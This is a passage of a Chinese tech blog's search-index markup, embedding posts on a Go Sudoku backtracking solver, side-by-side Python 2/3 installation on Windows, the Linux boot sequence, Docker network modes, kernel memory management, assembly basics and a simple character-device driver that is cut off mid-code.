    backtracking = func(board [][]byte) int {
        for i := 0; i &amp;lt; 9; i++ {
            for j := 0; j &amp;lt; 9; j++ {
                if board[i][j] == &#39;.&#39; {
                    for k := 1; k &amp;lt;= 9; k++ {
                        if numrow[i][k] == 0 &amp;amp;&amp;amp; numcol[j][k] == 0 &amp;amp;&amp;amp; num9[i / 3 * 3 + j / 3][k] == 0 {
                            numrow[i][k] = 1
                            numcol[j][k] = 1
                            num9[i / 3 * 3 + j / 3][k] = 1
                            board[i][j] = byte(k + &#39;0&#39;)
                            if backtracking(board) == 1 {
                                return 1
                            }
                            numrow[i][k] = 0
                            numcol[j][k] = 0
                            num9[i / 3 * 3 + j / 3][k] = 0
                            board[i][j] = &#39;.&#39;
                        }
                    }
                    return 0
                }
            }
        }
        return 1
    }
    backtracking(board)
}
&lt;/code&gt;&lt;/pre&gt;
">【算法】回溯</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/tong-shi-an-zhuang-python2pip2he-python3pip3/"" data-c="
          &lt;p&gt;在官网正常下载python2和python3安装包安装，然后在环境变量的path下添加安装的位置：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;C:\Program Files\Python27\
C:\Program Files\Python27\Scripts\
C:\Program Files\Python39\
C:\Program Files\Python39\Scripts\
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;将Python39下的python.exe重命名为python3.exe&lt;br&gt;
将Python39\Scripts\下的pip.exe删掉。&lt;/p&gt;
&lt;p&gt;下面在cmd中python即为python2，python3即为python3，pip和pip3也同理。&lt;/p&gt;
&lt;p&gt;如果pip3提示：&lt;code&gt;Fatal error in launcher: Unable to create process using &#39;&amp;quot;c:\program files\python39\python.exe&amp;quot;&lt;/code&gt;&lt;br&gt;
就重新升级一些pip3：&lt;code&gt;python3 -m pip install --upgrade pip&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;如果python2目录下没有Scripts目录，则需要安装一些pip：&lt;code&gt;python -m ensurepip&lt;/code&gt;&lt;/p&gt;
">同时安装python2(pip2)和python3(pip3)</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/linux-00linux-qi-dong-guo-cheng/"" data-c="
          &lt;h3 id=&#34;1post开机自检&#34;&gt;1.POST开机自检&lt;/h3&gt;
&lt;p&gt;linux开机加电后，系统开始开机自检，该过程主要对计算机各种硬件设备进行检测，如CPU、内存、主板、硬盘、CMOS芯片等，如果出现致命故障则停机，并且由于初始化过程还没完成，所以不会出现任何提示信号；如果出现一般故障则会发出声音等提示信号，等待故障清除；若未出现故障，加电自检完成。&lt;/p&gt;
&lt;h3 id=&#34;2加载bios&#34;&gt;2.加载BIOS&lt;/h3&gt;
&lt;p&gt;开机自检完成后，CPU首先读取位于CMOS中的BIOS程序，按照BIOS中设定的启动次序（Boot Sequence)逐一查找可启动设备，找到可启动的设备后，去该设备的第一个扇区中读取主引导目录（MBR），那么MBR是什么？它又有什么作用？&lt;/p&gt;
&lt;p&gt;MBR存在于可启动磁盘的0磁道0扇区，占用512字节，它主要用来告诉计算机从选定的可启动设备的哪个分区来加载引导加载程序（Boot loader)，MBR中存在如下内容：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Boot Loader 占用446字节，存储有操作系统（OS）相关信息，如操作系统名称，操作系统内核位置等，它的主要功能是加载内核到内存中运行。&lt;/li&gt;
&lt;li&gt;Partition Table 分区表，占用64字节，每个主分区占用16字节（这就是为什么一块硬盘只能有4个主分区）&lt;/li&gt;
&lt;li&gt;分区表有效性标记占用2字节 ，CPU将MBR读取至内存，运行GRUB(Boot Loader常用的有GRUB和LILO两种，现在常用的是GRUB），GRUB会把内核加载到内存去执行。&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# ll /boot
...
-rwxr-xr-x. 1 root root  6762688 Mar 31  2020 vmlinuz-3.10.0-1127.el7.x86_64
initramfs-2.6.32-642.el6.x86_64.img
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以看出，内核文件存在于/boot/目录下，3.10.0-1127是内核版本号，el7是操作系统版本。但是在GRUB加载内核时，连/还没有被加载，它是怎么在磁盘上找到内核的？加载内核不通过根文件系统，而是直接访问磁盘分区，因为此时内核还没有启动，不存在文件系统。看一下grub配置文件(centos在/boot/grub2/grub.cfg)：&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1631340349988.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;在/boot/grub/grub.conf中可以看到&lt;code&gt;root(hd0,0)&lt;/code&gt;，表示内核文件和加载根文件系统的驱动程序的位置在第一块硬盘的第一个分区下，在此分区中的目录/boot/，驱动程序可在initramfs-2.6.32-642.el6.x86_64.img中加载。&lt;/p&gt;
&lt;p&gt;这个阶段总结起来就是通过引导程序找到内核并加载到内存中。&lt;/p&gt;
&lt;h3 id=&#34;3加载内核初始化initrd&#34;&gt;3.加载内核，初始化initrd&lt;/h3&gt;
&lt;p&gt;将内核加载至内存之后，内核会进行接下来的工作：探测硬件-&amp;gt;加载驱动-&amp;gt;挂载根文件系统(initrd)-&amp;gt;切换至根文件系统(rootfs)-&amp;gt;运行/sbin/init完成初始化工作。&lt;/p&gt;
&lt;p&gt;此时会出现一个问题，要访问根文件系统，需要先挂载，而挂载根文件系统需要先加载根文件系统的驱动程序，为了解决这个问题，GRUB在加载内核至内存中时，也把initrd加载内核中并运行，而initrd有什么作用呢？&lt;/p&gt;
&lt;p&gt;initrd镜像文件也存在于/boot中，将其展开后：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;bin  dev  etc  init  lib  lib64  proc  root  run  sbin  shutdown  sys  sysroot  tmp  usr  var
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可见它和我们常见的根目录的文件很像，里面有bin、lib、lib64、sys、var、etc、sysroot、 dev、proc、tmp等目录，它的功能现在内存中建立一个虚拟的根文件系统，然后再加载根文件系统(rootfs)的驱动，然后以读写的方式挂载，就是真正的根文件系统。&lt;/p&gt;
&lt;h3 id=&#34;4运行sbininit运行系统初始化&#34;&gt;4.运行/sbin/init，运行系统初始化&lt;/h3&gt;
&lt;p&gt;挂载根文件系统的其中一个目的就是运行init进程需要一个文件系统作为载体，在完成根文件系统的挂载之后，会执行第一个进程init，init首先运行/etc/init/下的脚本。&lt;/p&gt;
&lt;p&gt;init主要完成的工作是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;获得网络环境&lt;/li&gt;
&lt;li&gt;挂载设备&lt;/li&gt;
&lt;li&gt;开机启动画面Plymouth（取替了过往的 RHGB）&lt;/li&gt;
&lt;li&gt;判断是否启用SELinux&lt;/li&gt;
&lt;li&gt;显示于开机过程中的欢迎画面&lt;/li&gt;
&lt;li&gt;初始化硬件&lt;/li&gt;
&lt;li&gt;用户自定义模块的加载&lt;/li&gt;
&lt;li&gt;配置内核的参数&lt;/li&gt;
&lt;li&gt;设置主机名&lt;/li&gt;
&lt;li&gt;同步存储器&lt;/li&gt;
&lt;li&gt;设备映射器及相关的初始化&lt;/li&gt;
&lt;li&gt;初始化软件磁盘阵列（RAID）&lt;/li&gt;
&lt;li&gt;初始化 LVM 的文件系统功能&lt;/li&gt;
&lt;li&gt;检验磁盘文件系统（fsck）&lt;/li&gt;
&lt;li&gt;设置磁盘配额(quota)&lt;/li&gt;
&lt;li&gt;重新以可读写模式挂载系统磁盘&lt;/li&gt;
&lt;li&gt;更新quota（非必要）&lt;/li&gt;
&lt;li&gt;启动系统虚拟随机数生成器&lt;/li&gt;
&lt;li&gt;配置机器（非必要）&lt;/li&gt;
&lt;li&gt;清除开机过程当中的临时文件&lt;/li&gt;
&lt;li&gt;创建ICE目录&lt;/li&gt;
&lt;li&gt;启动交换分区（swap）&lt;/li&gt;
&lt;li&gt;将开机信息写入/var/log/dmesg文件中&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;等。然后根据/etc/inittab中设定的系统运行默认级别，然后按照对应的级别x，运行/etc/rc.d/rcx脚本.....&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;在较新的linux内核版本中，使用了systemd替换调了init进程作为第一个进程启动。&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;5打印登录提示信息&#34;&gt;5.打印登录提示信息&lt;/h3&gt;
&lt;p&gt;系统初始化完成后，init给出用户登录提示符（login）或者图形化登录界面，用户输入用户和密码登陆后，系统会为用户分配一个用户ID（uid）和组ID（gid），这两个ID是用户的身份标识，用于检测用户运行程序时的身份验证。登录成功后，整个系统启动流程运行完毕！&lt;/p&gt;
&lt;p&gt;参考：https://cloud.tencent.com/developer/article/1114481&lt;/p&gt;
">【linux】linux启动过程</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/rong-qi-wang-luo/"" data-c="
          &lt;p&gt;Docker容器网络资源通过内核的Network Namespace机制实现隔离，不同的Network Namespace有的各自的网络设备、协议栈、路由表、防火墙规则等，反之，统一Network Namespace下的进程共享同一网络视图。通过对Network Namespace的灵活操作，Docker提供了五种容器网络模式：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;none：不为容器配置任何网络配置&lt;br&gt;
&lt;code&gt;docker run --net=none -it ubuntu ip addr show&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;container：与另一个运行中的容器共享Network Namespace，共享相同的网络视图&lt;br&gt;
&lt;code&gt;docker run --net=container:d258... -it ubuntu /bin/bash&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;host：与主机共享Root Network Namespace，容器有完整的权限可以操纵主机的协议栈、路由表和防火墙，所以这种方式是不安全的。&lt;br&gt;
&lt;code&gt;docker run --net=host -it ubuntu /bin/bash&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;bridge：Docker设计的NAT网络模型。&lt;br&gt;
这种方式是Docker 默认的运行方式，Docker daemon启动时会在主机创建一个linux网桥(默认为docker0)，容器启动时，Docker会创建一对veth pair设备，该设备是成对出现的，相当于一个网线的两个接口，一端接在容器的Network Namespace，另一端接在docker0网桥上，从而可以实现容器的网络通信。&lt;br&gt;
网桥模式下，Docker容器和Internet的通信，以及不同容器之间的通信，都是通过iptables规则控制的。总之，docker网络的初始化动作包括：创建docker0网桥，为docker0网桥新建子网以及路由、创建相应的iptables规则等。默认子网网段为172.17.0.0/16。&lt;/li&gt;
&lt;li&gt;overlay：Docker原生的跨主机多子网模型。&lt;br&gt;
这种方式比较复杂，不想学了。&lt;/li&gt;
&lt;/ol&gt;
">【容器】网络配置</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/linux-04-nei-cun-guan-li/"" data-c="
          &lt;ul&gt;
&lt;li&gt;内存管理单元(MMU)，通过分段分页的机制，提供虚拟地址到物理地址的映射方法。&lt;/li&gt;
&lt;li&gt;linux内核态进程之间共享地址空间，如果进行管理？&lt;/li&gt;
&lt;li&gt;linux用户态进程之间地址空间是隔离的，如果进行管理？&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;读Linux内核以及相关的资料的时候，时刻要清醒地认识到它说的是内核态还是用户态的东西。&lt;/li&gt;
&lt;li&gt;一个用户态进程/线程在内核中都是用一个task_struct的实例描述的，这个有点类似设计模式里面的桥接模式(handle-body), 用户态看到的进程PID，线程TID都是handle, task_struct是body。&lt;/li&gt;
&lt;li&gt;C语言书里面讲的堆、栈大部分都是用户态的概念，用户态的堆、栈对应用户进程虚拟地址空间里的一个区域，栈向下增长，堆用malloc分配，向上增长。&lt;/li&gt;
&lt;li&gt;用户空间的堆栈，在task_struct-&amp;gt;mm-&amp;gt;vm_area里面描述，都是属于进程虚拟地址空间的一个区域。&lt;/li&gt;
&lt;li&gt;而内核态的栈在tsak_struct-&amp;gt;stack里面描述，其底部是thread_info对象，thread_info可以用来快速获取task_struct对象。整个stack区域一般只有一个内存页(可配置)，32位机器也就是4KB。&lt;/li&gt;
&lt;li&gt;所以说，一个进程的内核栈，也是进程私有的，只是在task_struct-&amp;gt;stack里面获取。&lt;/li&gt;
&lt;li&gt;内核态没有进程堆的概念，用kmalloc()分配内存，实际上是Linux内核统一管理的，一般用slab分配器，也就是一个内存缓存池，管理所有可以kmalloc()分配的内存。所以从原理上看，在Linux内核态，kmalloc分配的所有的内存，都是可以被所有运行在Linux内核态的task访问到的。&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;作者：向晨&lt;br&gt;
链接：https://www.zhihu.com/question/57013926/answer/151306072&lt;br&gt;
来源：知乎&lt;br&gt;
著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。&lt;/p&gt;
&lt;/blockquote&gt;
">【linux】内存管理</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/hui-bian-01-ji-suan-ji-di-ceng-ji-chu/"" data-c="
          &lt;h3 id=&#34;汇编语言的组成&#34;&gt;&lt;strong&gt;汇编语言的组成&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;汇编语言由以下3类指令组成：&lt;br&gt;
1）汇编指令（与机器指令一一对应，它是机器码的助记符）&lt;br&gt;
2）伪指令（由编译器识别并执行）&lt;br&gt;
3）其它符号（由编译器识别并执行）&lt;br&gt;
汇编语言的核心是汇编指令，汇编指令决定了汇编程序的特性。&lt;/p&gt;
&lt;h3 id=&#34;什么是存储器&#34;&gt;&lt;strong&gt;什么是存储器？&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;CPU是计算机的核心部件，它控制着整个计算机的运作并进行系统运算，要想让CPU工作，就必须向它提供机器指令和数据，指令是告诉CPU怎么做，数据是CPU执行任务的原材料。这些机器指令和数据是存放在存储器中的。计算机中大多数的硬件都有存储器，除了CPU外，显卡、BIOS等也都有自己独立的存储器。&lt;br&gt;
存储器的存储容量单位是字节（Byte，一个字节有8位 bit，即2的8次方），1KB=1024Byte，1MB=1024KB，1GB=1024MB，1TB=1024GB。&lt;br&gt;
磁盘的容量单位和存储器的容量单位是一样的。Byte单位是微机中最最常用的计量单位。&lt;/p&gt;
&lt;h4 id=&#34;什么是内存&#34;&gt;&lt;strong&gt;什么是内存？&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;内存是计算机结构中最主要的一个存储器，仅此而已。存储器不等于内存，比如显卡中的显存也属于存储器，所以存储器包括了内存、显存等多种类型的存储器。在一台PC机中，内存的作用仅次于CPU。离开了内存，性能再好的CPU也无法工作。磁盘不同于内存，磁盘中的数据或程序如果不讲到内存中去，它就无法被CPU使用。所以，学习汇编语言基本上就是在学习CPU如何调用并使用内存中的数据。&lt;/p&gt;
&lt;h4 id=&#34;什么是指令和数据&#34;&gt;&lt;strong&gt;什么是指令和数据？&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;指令和数据是应用上的概念，同一串二进制代码，可以是指令，也可以是数据，这决定于我们的程序设计。如下示例：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-undefined&#34;&gt;1000100111011000
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;当被应用为数据时，它等于 89D8H，H 表示是十六进制。当被应用为指令时，它指的是 MOV  AX, BX。&lt;br&gt;
&lt;strong&gt;不难看出，同一串二进制代码，应用不同，既可以作为指令使用，也可以作为数据来使用。&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;什么是存储单元&#34;&gt;&lt;strong&gt;什么是存储单元？&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;存储器被划分为若干个存储单元，每个存储单元都从0开始顺序编号。比如一个存储器有128个存储单元，则它的编号范围是 0~127。&lt;/p&gt;
&lt;h4 id=&#34;cpu对存储器的读写操作&#34;&gt;&lt;strong&gt;CPU对存储器的读写操作&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;CPU要想实现数据的读写操作，就必须与外部器件（芯片）进行以下三类信息的交互：&lt;br&gt;
1）地址信息，即存储单元的地址&lt;br&gt;
2）控制信息，即对存储器的存储器件（芯片）的选择——读或写&lt;br&gt;
3）数据信息，即将要用于读或写的数据&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;那么CPU是通过什么将地址信息、控制信息和数据信息传递到存储器芯片中的呢？&lt;/strong&gt;&lt;br&gt;
我们知道，电子计算机能处理和传输的信息都是电信号，电信号是使用导线来传送的，所以CPU也是通常导线把地址信息、控制信息和数据信息传递至存储器的存储芯片中去的。在计算机中，专门有连接CPU和其它存储器芯片的导线，这些导线通常被称为总线。总线在物理上即一根根导线的集合，在逻辑上可以被划分为地址总线、控制总线和数据总线（这与上述CPU交互的三类信息相对应）。这里特别说明，存储器包括了内存、显存、网卡中的存储器等多种类型的存储器。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https:////upload-images.jianshu.io/upload_images/2463290-36799d4b31a55cd0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/503/format/webp&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;读写过程基本如下：首先CPU通过地址总线把地址信息传递至存储器，对应地找到目标存储单元；CPU又通过控制总线把控制信息（读操作或写操作）传递至存储器，找到对应读或写的芯片器件；CPU最后通过数据总线把将要被读或被写的数据信息传递至目标存储单元，执行数据的读或写。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;关于8086CPU&lt;/strong&gt;&lt;br&gt;
8086CPU是一款经典的CPU，它的数据总线宽度是 16位。无论当下CPU更新速度多么快，它们都与8086CPU的技术架构是一致的，变化的只是晶体管的数量多了，导线的数量多了而已。学好了8086CPU的工作原理，基本上就能举一反三地学习其它更高级的CPU了。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;地址总线&lt;/strong&gt;&lt;br&gt;
CPU是通过地址总线来寻找和指定存储单元的，地址总线上能传输多少个不同的地址信息，那么CPU就可以对多少个存储单元进行寻址。如果一个CPU有 N 根地址总线，则可以说这个CPU的地址总线宽度即为N，那么这个CPU最多可以寻找到 2 的N次方个存储单元。地址总线的宽度，决定了CPU的寻址能力。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https:////upload-images.jianshu.io/upload_images/2463290-009f99bf880ea100.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/279/format/webp&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;控制总线&lt;/strong&gt;&lt;br&gt;
CPU对外部器件的控制是通过控制总线来实现的。控制总线是一些不同类型的控制线的集合。理论上讲，有多少根控制总线，就意味着CPU能提供对外器件的多少种控制。这里所说的控制，无非就是读和写两种，对一根控制线来讲，发送0表示读（低电平），发送1表示写（高电平）。有多少根控制线，就能控制多少个外部器件。控制总线的宽度，决定了CPU对外部器件的控制能力。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https:////upload-images.jianshu.io/upload_images/2463290-61ead89d2ff94a43.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/355/format/webp&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;数据总线&lt;/strong&gt;&lt;br&gt;
CPU与存储器之间的数据信息传输是通过数据总线来完成的。数据总线的宽度决定了CPU和外界的数据传输速度。可以把数据总线类比成高速公路，路面上的车道数越多，则通车的速度就更快。举例说明，8088CPU的数据总线宽度是8位（即有8根数据总线），如果它要把 8D99H 这个数据传递至存储器，则需要传递两次，先把低位 99 传递过去，再把高位的 8D 传递过去；如果是 8086CPU，则只需要一次传递即可把 8D99H 传递至存储器，因为 8086CPU 的数据总线宽度是 16 位（即有16根数据总线）的。数据总线的宽度，是决定CPU运算速度的因素之一（当今的CPU之所以工作速度越来越快，这不仅仅与数据总线宽度越来越宽有关，还与寄存器、二级缓存数量的增加有关，还与“打孔-&amp;gt;计电器-&amp;gt;电子管-&amp;gt;晶体管”的技术发展有关）。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https:////upload-images.jianshu.io/upload_images/2463290-cd77d56712384e68.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/440/format/webp&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;什么是主板&#34;&gt;&lt;strong&gt;什么是主板？&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;在每台PC机中，都有一块主板，主板上有着电脑所必须的核心器件和一些主要器件，这些器件通过总线（地址总线、数据总线、控制总线）相互连接在一起。&lt;/p&gt;
&lt;h4 id=&#34;什么是接口卡&#34;&gt;&lt;strong&gt;什么是接口卡？&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;在计算机系统中，所有可用程序控制其工作的设备，都必须受到CPU的控制。但是CPU又不能直接对外部设备进行控制。事实上，直接控制这些外部设备的硬件就是接口卡，这些接口卡是插在扩展插槽上的。这些外部设备如显示器、音箱、打印机等。CPU通过总线控制这些接口卡，从而间接地控制着这些外部设备。但凡没有连接到接口卡的外部设备，都无法被CPU控制。&lt;br&gt;
显卡、网卡、声卡等等，都是接口卡。CPU控制显卡，显卡再控制显示器的显示。CPU控制网卡，网卡再与外部的网线进行通信交流。&lt;/p&gt;
&lt;h4 id=&#34;存储器的分类rom-ram&#34;&gt;&lt;strong&gt;存储器的分类（ROM / RAM）&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;从读写属性上划分，可以分为随机存储器（RAM）和只读存储器（ROM）。随机存储器中的数据可读可写，当电脑断电时数据会丢失，比如内存；只读存储器只能读数据，不能写入数据，电脑断电后数据不会丢失，这些数据是硬件设计者预先写入的，比如BIOS的ROM。&lt;br&gt;
从功能和连接类型上划分，可以分为常用RAM，接口卡的RAM，接口卡上的ROM。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;5&#34;&gt;&lt;img src=&#34;https:////upload-images.jianshu.io/upload_images/2463290-6e5fd571dd44977a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/604/format/webp&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;上图中，显卡上的ROM是为电脑开机显示器显示时所需要的基本输入输出数据，显卡上的RAM可以动态地写入数据并显示在显示器上。&lt;/p&gt;
&lt;h4 id=&#34;什么是bios&#34;&gt;&lt;strong&gt;什么是BIOS？&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;BIOS即Basic Input/Output System，基本输入输出系统。BIOS是由主板和各类接口卡（网卡、显示等）厂商提供的软件系统，通过BIOS可以利用硬件设备实现最基本的输入输出。不仅是主板有BIOS，一些接口卡上也有BIOS。BIOS中的ROM就是只读存储器，专为相应硬件提供最基本的输入输出。&lt;/p&gt;
&lt;h4 id=&#34;什么是逻辑存储器内存地址空间&#34;&gt;&lt;strong&gt;什么是逻辑存储器（内存地址空间）？&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;对CPU来讲，系统中所有物理存储器中的存储单元都处在一个统一的逻辑存储器中，这个逻辑存储器的容量大小受到CPU寻址能力的限制。如果一个CPU的地址总线宽度为10 ，则该CPU可以寻址的存储单元为1024个，这1024个可寻到的存储单元就构成了这个CPU的&lt;strong&gt;内存地址空间&lt;/strong&gt;，也叫做&lt;strong&gt;逻辑存储器&lt;/strong&gt;。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;6&#34;&gt;&lt;img src=&#34;https:////upload-images.jianshu.io/upload_images/2463290-a3b0dfddd83c325b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/592/format/webp&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;从CPU的视角来看，它将各类物理存储器看作是一个逻辑存储器。所有的物理存储器都被看作是一个由若干存储单元组成的逻辑存储器；每个物理存储器在这个逻辑存储中都会占有一个地址段，即一段地址空间；CPU在这段地址空间中进行数据读写，实际上就是在其相对应的物理存储器中进行数据读写。&lt;/p&gt;
&lt;p&gt;计算机系统结构中的各个物理存储器，在物理上是独立存在的器件，它们都和CPU的总线相连。CPU对它们进行读或写，是通过控制总线发出读写命令的。&lt;/p&gt;
&lt;p&gt;对CPU来讲，它看到的只是这个逻辑存储器。逻辑存储器中地址段是由各个物理存储器报上来的。举例说明，比如某个CPU的逻辑存储器地址段分配如下，地址0~7FFFH 这32KB空间是主RAM，地址8000H9FFFH这8KB空间是显存RAM，地址A000HFFFFH这24KB空间是其它器件ROM。&lt;/p&gt;
&lt;p&gt;不同的计算机系统，其内存地址空间的分配情况也是不尽相同的。比如8086CPU的PC机，其逻辑存储器的地址空间分配如下图示：&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;7&#34;&gt;&lt;img src=&#34;https:////upload-images.jianshu.io/upload_images/2463290-25624f7c20c0ea93.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/496/format/webp&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;最终运行程序的器件是CPU。我们用汇编语言编程的时候，必须要从CPU的角度去考虑问题。即使是用高级编程语言去编写程序，经过编译后还是会变成汇编程序，再由汇编程序转译成机器码，进一步交给CPU去执行。因此，&lt;strong&gt;学会从CPU的角度去思考问题并编程，是我们学习汇编语言的核心目的&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;本章小结&lt;/strong&gt;&lt;br&gt;
1）汇编指令是机器指令的助记符，它们是一一对应的关系。基于这种一一对应的关系，汇编程序通过编译可以转译成机器指令程序；.exe程序通过反编译可以将其转化成汇编程序。&lt;br&gt;
2）每种型号的CPU，都有自己特有的汇编指令集。&lt;br&gt;
3）CPU能够直接使用的信息都存放在存储中，并且CPU有且只能直接使用存储器中的数据。&lt;br&gt;
4）在存储器中，指令和数据是没有任何区别的，它们都是二进制信息。唯一区分它们的方式就是，这些信息是通过哪种类型的总线来传输的，使用地址总线传输的信息是地址信息，使用数据总线传输的信息是数据信息，使用控制总线传输的信息是控制信息。&lt;br&gt;
5）存储器中的存储单元都是从0开始顺序编号的。&lt;br&gt;
6）一个存储单元可以存储8位bit，所以一个存储单元的存储容量即为一个字节 Byte（2的8次方），1Byte = 8bit。&lt;br&gt;
7）CPU芯片有很多管脚，这些管脚分别和每一条总线相连接。正是这些管理，从CPU端引出了三种类型的总线，总线的数量（宽度）标志着CPU各个方面的性能。其中地址总线的宽度决定了CPU的寻址能力；数据总线的宽度决定着CPU与其它器件交换数据时的单次数据传送量；控制总线决定了CPU对系统中其它器件的控制能力。&lt;/p&gt;
">【汇编】计算机底层</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/linux-02-jian-dan-de-zi-fu-she-bei-qu-dong/"" data-c="
          &lt;ol&gt;
&lt;li&gt;驱动代码&lt;/li&gt;
&lt;li&gt;Makefile&lt;/li&gt;
&lt;li&gt;编译和加载驱动&lt;/li&gt;
&lt;li&gt;编写应用程序测试驱动&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;驱动程序&#34;&gt;驱动程序&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;// hello.c 驱动程序
#include &amp;lt;linux/module.h&amp;gt;
#include &amp;lt;linux/moduleparam.h&amp;gt;
#include &amp;lt;linux/cdev.h&amp;gt;
#include &amp;lt;linux/fs.h&amp;gt;
#include &amp;lt;linux/wait.h&amp;gt;
#include &amp;lt;linux/poll.h&amp;gt;
#include &amp;lt;linux/sched.h&amp;gt;
#include &amp;lt;linux/slab.h&amp;gt;

#define BUFFER_MAX    (10)
#define OK            (0)
#define ERROR         (-1)

struct cdev *gDev;
struct file_operations *gFile;
dev_t  devNum;
unsigned int subDevNum = 1;
int reg_major  =  232;     // 主设备号 标识一类设备
int reg_minor =   0;       // 次设备号 标识该类设备的哪个设备
char *buffer;

int hello_open(struct inode *p, struct file *f)
{
    printk(KERN_INFO &amp;quot;hello_open\r\n&amp;quot;);
    return 0;
}

ssize_t hello_write(struct file *f, const char __user *u, size_t s, loff_t *l)
{
    printk(KERN_INFO &amp;quot;hello_write\r\n&amp;quot;);
    return 0;
}

ssize_t hello_read(struct file *f, char __user *u, size_t s, loff_t *l)
{
    printk(KERN_INFO &amp;quot;hello_read\r\n&amp;quot;);      
    return 0;
}

int hello_init(void)
{
    devNum = MKDEV(reg_major, reg_minor); // 根据主次设备号生成一个设备号(为一个设备一个设备号)
    if(OK == register_chrdev_region(devNum, subDevNum, &amp;quot;helloworld&amp;quot;)){  // 将该设备注册到内核
        printk(KERN_INFO &amp;quot;register_chrdev_region ok \n&amp;quot;); 
    }else {
    printk(KERN_INFO &amp;quot;register_chrdev_region error n&amp;quot;);
        return ERROR;
    }
    printk(KERN_INFO &amp;quot; hello driver init \n&amp;quot;);

    gDev = kzalloc(sizeof(struct cdev), GFP_KERNEL);  // 申请一个cdev结构体，用于描述设备
    gFile = kzalloc(sizeof(struct file_operations), GFP_KERNEL); // file_operations是设备的操作的抽象函数

// 下面就是将自定义的操作函数赋予该设备的操作列表中
    gFile-&amp;gt;open = hello_open;
    gFile-&amp;gt;read = hello_read;
    gFile-&amp;gt;write = hello_write;
    gFile-&amp;gt;owner = THIS_MODULE;

    cdev_init(gDev, gFile); // 建立dev和操作的联系
